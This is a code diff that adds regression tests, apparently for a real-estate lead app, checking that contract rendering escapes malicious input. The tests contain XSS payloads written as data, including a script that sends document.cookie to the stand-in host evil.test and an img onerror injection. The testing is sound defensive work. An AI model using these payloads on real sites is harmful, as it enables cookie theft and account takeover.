@@ -216,3 +216,61 @@ def test_dashboard_renders_ok_when_backend_works():
     r = client.get("/")
     assert r.status_code == 200, r.text[:200]
     assert "Pipeline" in r.text
+
+
+def test_render_contract_escapes_values():
+    """Regression: render_contract() used to substitute raw form values
+    into the contract HTML, which is then rendered with Jinja2's |safe
+    (bypassing its auto-escaping, on purpose, so the template's own markup
+    renders). Contract values come from a submitted form or from
+    autofill_values(), which pulls from a scraped lead's address/owner
+    fields -- a malicious listing title or a stray <script> typed into a
+    field must render as literal text, not execute, when the contract is
+    later opened."""
+    from app import contracts
+    tmpl = contracts.get_template("purchase_agreement")
+    payload = "<script>fetch('//evil.test/steal?c='+document.cookie)</script>"
+    values = {f["name"]: payload if f["name"] == "seller_name" else "" for f in tmpl["fields"]}
+    html = contracts.render_contract(tmpl, values)
+    assert "<script>" not in html
+    assert "&lt;script&gt;" in html
+
+
+def test_render_contract_escapes_autofilled_lead_data():
+    """Same bug, the realistic path: a scraped listing's address/owner
+    name flows through autofill_values() straight into the contract."""
+    from app import contracts, db
+    lead = db.add_lead({
+        "address": '"><img src=x onerror=alert(1)>',
+        "city": "Winnipeg",
+        "owner_name": "<b>Evil</b> Seller",
+        "owner_phone": "204-555-0000",
+    })
+    tmpl = contracts.get_template("purchase_agreement")
+    values = contracts.autofill_values(tmpl, lead)
+    html = contracts.render_contract(tmpl, values)
+    assert "<img" not in html
+    assert "<b>" not in html
+    assert "Evil" in html  # the harmless text content still comes through
+
+
+def test_contract_generate_route_escapes_submitted_values():
+    """End-to-end: POST a malicious contract field through the real route
+    and confirm the rendered print page never contains live markup."""
+    from starlette.testclient import TestClient
+    from app import db, main
+    lead = db.add_lead({"address": "1 Test St", "city": "Winnipeg"})
+    client = TestClient(main.app, raise_server_exceptions=False)
+    r = client.post(
+        f"/leads/{lead['id']}/contracts/purchase_agreement",
+        data={"seller_name": "<script>alert(document.cookie)</script>",
+              "buyer_name": "B", "property_address": "1 Test St",
+              "city": "Winnipeg", "postal": "", "purchase_price": "1000",
+              "earnest_amount": "500", "earnest_days": "3",
+              "escrow_holder": "", "closing_date": "", "inspection_days": "10",
+              "disclosures": "None.", "personal_property": "None.",
+              "date": "2026-01-01"},
+    )
+    assert r.status_code == 200, r.text[:200]
+    assert "<script>alert" not in r.text
+    assert "&lt;script&gt;alert" in r.text
